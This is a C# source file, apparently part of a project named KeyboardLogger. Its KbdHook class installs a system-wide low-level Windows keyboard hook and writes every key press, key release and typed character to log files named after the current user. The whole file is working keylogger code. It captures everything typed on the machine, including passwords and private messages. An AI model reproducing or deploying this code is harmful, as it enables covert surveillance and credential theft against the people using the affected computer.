using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using KeyboardLogger.WindowsApi;



namespace KeyboardLogger.KeyLog
{
    class KbdHook
    {
        // data
        static IntPtr hHook = IntPtr.Zero;
        static LowLevelKeyboardProc kydbHookProc;
        static string user = Environment.UserName;
        static Log headLog = new Log("head");
        static Log keyLog = new Log(user + "-key");
        static Log txtLog = new Log(user + "-txt");

        public static void Init()
        {
            kydbHookProc = new LowLevelKeyboardProc(KbdHookProc);
            ProcessModule module = Process.GetCurrentProcess().MainModule;
            IntPtr hMod = Kernel32.GetModuleHandle(module.ModuleName);
            hHook = User32.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, kydbHookProc, hMod, 0);
            headLog.Write("[" + user + "] ");
            headLog.Write(user + "-key ");
            headLog.Write(user + "-txt ");
            headLog.Flush();
            KbdChar.Init();
        }


        // keyboard hook procedure
        static IntPtr KbdHookProc(int code, WM wParam, [In]KBDLLHOOKSTRUCT lParam)
        {
            if (code >= 0)
            {
                Keys key = (Keys)lParam.vkCode;
                bool active = (wParam == WM.KEYDOWN || wParam == WM.SYSKEYDOWN);
                keyLog.Write(active ? key + "+ " : key + "- ");
                txtLog.Write(KbdChar.Char(lParam.vkCode, active));
            }
            return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
    }
}
